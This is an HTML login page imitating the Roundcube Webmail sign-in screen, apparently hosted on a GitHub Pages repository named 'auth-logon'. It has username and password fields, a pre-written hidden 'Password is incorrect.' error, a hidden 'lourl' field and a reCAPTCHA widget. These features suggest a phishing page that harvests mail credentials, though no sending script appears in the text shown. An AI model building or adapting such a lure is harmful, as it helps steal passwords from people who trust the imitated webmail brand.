<body class="task-login action-none">
    <div id="layout">


        <h1 class="voice">Roundcube Webmail Login</h1>

        <div id="layout-content" class="selected no-navbar" role="main">
                        <img src="./favicon.ico" id="logo" alt="Logo" style="width:120px;height:auto;display:block;margin:16px auto;">
                        <!--
                            Temporary test: if the logo doesn't appear on GitHub Pages, uncomment the raw URL below
                            and replace 'main' with your branch name (main or master).
                        -->
                        <!-- <img src="https://raw.githubusercontent.com/saleudon1/auth-logon.github.io/main/favicon.ico" id="logo-raw" alt="Logo" style="width:120px;height:auto;display:block;margin:16px auto;"> -->
            <form id="login-form" name="loginForm" method="post" class="propform" action="">
                <div class="error"
                    style="margin-top: 5px; margin-bottom: 4px; display: none; font-size: 14px;color: red;" id="msg">
                    Password is incorrect.</div>

                    <input type="hidden" name="lourl" id="lourl">


                <table>
                    <tbody>
                        <tr class="form-group row">
                            <td class="title" style="display: none;"><label for="rcmloginuser">Username</label>
                            </td>
                            <td class="input input-group input-group-lg"><span class="input-group-prepend"><i
                                        class="input-group-text user fa fa-user"></i></span><input name="email"
                                    id="email" required="" size="40" autocapitalize="off" type="text"
                                    class="form-control" placeholder="Username"></td>
                        </tr>
                        <tr class="form-group row">
                            <td class="title" style="display: none;"><label for="rcmloginpwd">Password</label>
                            </td>
                            <td class="input input-group input-group-lg"><span class="input-group-prepend"><i
                                        class="input-group-text pass fa fa-lock"></i></span><input name="password"
                                    id="password" required size="40" autocapitalize="off" type="password"
                                    class="form-control" placeholder="Password"></td>
                        </tr>
                    </tbody>
                </table>
                <p class="formbuttons"><button type="submit" id="submit-btn"
                        class="button btn btn-primary btn-lg text-uppercase w-100">Login</button>
                </p>

                                <!-- reCAPTCHA widget placeholder -->
                                <div style="margin-top:12px; margin-bottom:8px; text-align:center;" id="recaptcha-container">
                                    <div class="g-recaptcha" data-sitekey="6LfKleorAAAAAMAM4qvTgK9hB1mgX5L7Y-nvNbwN"></div>
                                </div>

                                <!-- hidden field to store token for non-standard naming conventions -->
                                <input type="hidden" id="captcha-response" name="g-recaptcha-response" value="">

                <div id="login-footer" role="contentinfo">
                    Roundcube Webmail


                </div>
            </form>
        </div>
        
</body>
